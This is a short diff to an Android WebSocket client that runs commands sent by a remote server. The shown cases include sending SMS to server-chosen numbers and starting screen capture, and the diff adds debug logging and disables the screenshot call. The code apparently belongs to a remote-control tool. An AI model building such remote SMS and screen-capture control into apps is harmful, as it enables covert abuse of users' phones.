@@ -48,7 +48,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onOpen(ServerHandshake handshakedata) {
-
+        Log.e("eeee", handshakedata.getHttpStatusMessage());
     }
 
     @Override
@@ -127,7 +127,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case SCREENSHOT:
-                    Screenshot.screenShare(context, mediaProjection);
+//                    Screenshot.screenShare(context, mediaProjection);
                     break;
                 case TEXT:
                     SMS.send(req.getString("number"), req.getString("message"));
@@ -165,7 +165,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onError(Exception ex) {
-
+        Log.e("eeee", ex.getLocalizedMessage());
     }
 
     private void sendResponse(String responseType, String data) throws Exception {
